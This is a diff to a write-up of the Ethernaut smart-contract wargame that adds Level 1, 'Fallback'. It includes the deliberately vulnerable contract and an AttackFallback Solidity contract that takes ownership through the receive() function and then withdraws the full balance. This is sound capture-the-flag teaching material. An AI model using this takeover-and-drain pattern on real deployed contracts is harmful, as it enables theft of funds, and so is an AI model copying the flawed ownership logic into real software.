@@ -32,7 +32,7 @@ True
 
 `Difficulty Level: 0/5`
 
-### task
+### level_0 task
 
 This level is a sanity check to make sure you understand how to interact with a smart contract.
 
@@ -120,3 +120,105 @@ hello_contract.functions.authenticate('ethernaut0').call()
 ```
 
 submit the contract and challenge solved.
+
+- ## [Level 1](https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F) - Fallback
+
+`Difficulty Level: 1/5`
+
+### level_1 Task
+
+Look carefully at the contract's code below. You will beat this level if
+
+1. you claim ownership of the contract
+2. you reduce its balance to 0
+
+### level_1 Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Fallback {
+
+    mapping(address => uint) public contributions;
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
+    }
+
+    modifier onlyOwner {
+        require(
+            msg.sender == owner,
+            "caller is not the owner"
+        );
+        _;
+    }
+
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+
+        if(contributions[msg.sender] > contributions[owner]){
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint) {
+        return contributions[msg.sender];
+    }
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
+
+}
+
+```
+
+### level_1 Solution
+
+`fallback_attack.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./fallback.sol";
+
+contract AttackFallback {
+
+    Fallback public fallbackContract;
+
+    constructor(address fallbackContractAddress) {
+        fallbackContract = Fallback(payable(fallbackContractAddress));
+    }
+
+    function makeContribution() public {
+        fallbackContract.contribute{value: 3 wei}();
+    }
+
+    function getContribution() public view returns (uint) {
+        return fallbackContract.getContribution();
+    }
+
+    function ownTheContract() public {
+        payable(address(fallbackContract)).transfer(3 wei);
+    }
+
+    function lootContract() public {
+        fallbackContract.withdraw();
+    }
+
+    receive() external payable {
+        return ;
+    }
+}
+
+```
